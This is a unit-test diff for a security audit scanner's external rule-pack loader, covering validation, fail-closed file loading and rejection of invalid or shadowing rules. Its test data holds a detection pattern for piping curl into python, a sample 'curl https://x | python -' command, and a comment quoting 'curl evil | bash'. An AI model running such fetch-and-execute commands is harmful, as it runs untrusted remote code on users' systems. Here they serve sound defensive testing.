@@ -420,6 +420,98 @@ class RuleMetadataTest(unittest.TestCase):
         self.assertEqual(len(audit._RULE_META), 22)
 
 
+class ExternalRulePackTest(unittest.TestCase):
+    """Local, validated, fail-closed rules-pack (docs/plans/2026-06-17-audit-rules-pack.md)."""
+
+    def tearDown(self):
+        audit.reset_rule_packs()
+
+    def _pack(self, *rules):
+        return {'version': 1, 'rules': list(rules)}
+
+    def test_valid_rule_loads_and_fires_with_meta(self):
+        n = audit.register_rule_pack(self._pack(
+            {'id': 'curl_pipe_python', 'severity': 'warn', 'why': 'pipes into python',
+             'pattern': r'curl\b.*\|\s*python', 'flags': ['i'],
+             'kind': 'campaign', 'added': '2026-06-17', 'source': 'test pack'}))
+        self.assertEqual(n, 1)
+        findings = audit.scan('curl https://x | python -\n')
+        hit = next(f for f in findings if f['rule'] == 'curl_pipe_python')
+        self.assertEqual(hit['severity'], 'warn')
+        self.assertEqual(hit['meta']['kind'], 'campaign')
+        self.assertEqual(hit['meta']['source'], 'test pack')
+        self.assertIn('curl_pipe_python', audit.all_rule_ids())
+        self.assertEqual(audit.rule_metadata('curl_pipe_python')['added'], '2026-06-17')
+
+    def test_reset_clears_external_rules(self):
+        audit.register_rule_pack(self._pack(
+            {'id': 'x_rule', 'severity': 'info', 'why': 'y', 'pattern': 'zzz'}))
+        self.assertIn('x_rule', audit.all_rule_ids())
+        audit.reset_rule_packs()
+        self.assertNotIn('x_rule', audit.all_rule_ids())
+        self.assertEqual([], audit.scan('zzz\n'))
+
+    def test_bad_top_level_shapes_load_nothing(self):
+        for obj in (None, [], 'nope', {'rules': 'notalist'}, {}, {'version': 1}):
+            self.assertEqual(([], {}), audit.load_rule_pack(obj))
+
+    def test_individual_invalid_rules_are_skipped_valid_kept(self):
+        rules, meta = audit.load_rule_pack(self._pack(
+            {'id': 'good_one', 'severity': 'warn', 'why': 'ok', 'pattern': 'abc'},
+            {'id': 'BadId', 'severity': 'warn', 'why': 'x', 'pattern': 'y'},      # bad charset
+            {'id': 'bad_sev', 'severity': 'critical', 'why': 'x', 'pattern': 'y'},  # bad severity
+            {'id': 'bad_re', 'severity': 'warn', 'why': 'x', 'pattern': '('},      # won't compile
+            {'id': 'no_why', 'severity': 'warn', 'why': '', 'pattern': 'y'},       # empty why
+            {'id': 'bad_flag', 'severity': 'warn', 'why': 'x', 'pattern': 'y', 'flags': ['z']},
+        ))
+        self.assertEqual([r[0] for r in rules], ['good_one'])
+        self.assertIn('good_one', meta)
+
+    def test_cannot_shadow_a_bundled_rule(self):
+        rules, _ = audit.load_rule_pack(self._pack(
+            {'id': 'eval', 'severity': 'info', 'why': 'shadow attempt', 'pattern': 'zzz'}))
+        self.assertEqual([], rules)  # 'eval' is bundled → rejected
+
+    def test_duplicate_ids_within_pack_kept_once(self):
+        rules, _ = audit.load_rule_pack(self._pack(
+            {'id': 'dup', 'severity': 'warn', 'why': 'a', 'pattern': 'a'},
+            {'id': 'dup', 'severity': 'info', 'why': 'b', 'pattern': 'b'},
+        ))
+        self.assertEqual([r[0] for r in rules], ['dup'])
+
+    def test_overlong_pattern_and_why_rejected(self):
+        rules, _ = audit.load_rule_pack(self._pack(
+            {'id': 'long_pat', 'severity': 'warn', 'why': 'x', 'pattern': 'a' * 3000},
+            {'id': 'long_why', 'severity': 'warn', 'why': 'x' * 600, 'pattern': 'a'},
+        ))
+        self.assertEqual([], rules)
+
+    def test_load_file_fails_closed(self):
+        self.assertEqual(0, audit.load_rule_pack_file('/no/such/audit_rules.json'))
+        import tempfile, os
+        fd, path = tempfile.mkstemp(suffix='.json')
+        try:
+            os.write(fd, b'{ this is not json')
+            os.close(fd)
+            self.assertEqual(0, audit.load_rule_pack_file(path))
+        finally:
+            os.unlink(path)
+        self.assertEqual(set(), {r for r in audit.all_rule_ids()} - audit._bundled_rule_ids())
+
+    def test_load_file_reads_a_valid_pack(self):
+        import tempfile, os, json
+        fd, path = tempfile.mkstemp(suffix='.json')
+        try:
+            os.write(fd, json.dumps(self._pack(
+                {'id': 'file_rule', 'severity': 'info', 'why': 'from file', 'pattern': 'WIDGET'}
+            )).encode())
+            os.close(fd)
+            self.assertEqual(1, audit.load_rule_pack_file(path))
+            self.assertTrue(any(f['rule'] == 'file_rule' for f in audit.scan('a WIDGET b\n')))
+        finally:
+            os.unlink(path)
+
+
 class ScanMechanicsTest(unittest.TestCase):
     def test_comment_lines_are_skipped(self):
         self.assertEqual([], audit.scan('# you should never do: curl evil | bash'))
